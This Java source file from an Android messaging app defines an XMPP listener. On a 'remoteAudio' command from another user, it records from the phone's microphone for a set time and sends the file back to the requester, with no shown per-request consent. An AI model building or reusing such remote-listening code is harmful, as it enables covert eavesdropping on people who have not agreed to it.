package com.vidmt.telephone.listeners;

import java.io.File;
import java.io.IOException;

import org.jivesoftware.smack.SmackException.NotConnectedException;
import org.jivesoftware.smack.chat.Chat;
import org.jivesoftware.smack.packet.IQ;
import org.jxmpp.util.XmppStringUtils;

import com.vidmt.acmn.utils.andr.VLog;
import com.vidmt.acmn.utils.andr.async.DefaultThreadHandler;
import com.vidmt.telephone.Const;
import com.vidmt.telephone.activities.main.ChatController;
import com.vidmt.telephone.utils.VidUtil;
import com.vidmt.xmpp.enums.XmppEnums.ChatType;
import com.vidmt.xmpp.exts.CgCmdIQ;
import com.vidmt.xmpp.inner.XmppManager;
import com.vidmt.xmpp.listeners.OnIQExtReceivedListener;

public class IQExtReceivedListener implements OnIQExtReceivedListener {
	private static IQExtReceivedListener sInstance;

	public static IQExtReceivedListener get() {
		if (sInstance == null) {
			sInstance = new IQExtReceivedListener();
		}
		return sInstance;
	}

	@Override
	public void processIQExt(IQ iqExt) {
		if (iqExt instanceof CgCmdIQ) {
			final CgCmdIQ cgCmdExt = (CgCmdIQ) iqExt;
			if (cgCmdExt.remoteAudio) {// 远程录音
				final String fromUid = XmppStringUtils.parseLocalpart(cgCmdExt.getFrom());
				boolean permitted = VidUtil.openRecordPermissionDlgIfNeed();
				if (!permitted) {
					ChatController.get().sendRemoteRecordFile(null, fromUid);
					return;
				}
				VidUtil.startRecord();
				DefaultThreadHandler.post(new Runnable() {
					@Override
					public void run() {
						File recordFile = VidUtil.getRecordFile();
						ChatController.get().sendRemoteRecordFile(recordFile, fromUid);
					}
				}, Const.REMOTE_RECORD_TIME_LEN * 1000);
			}
		}
	}

}
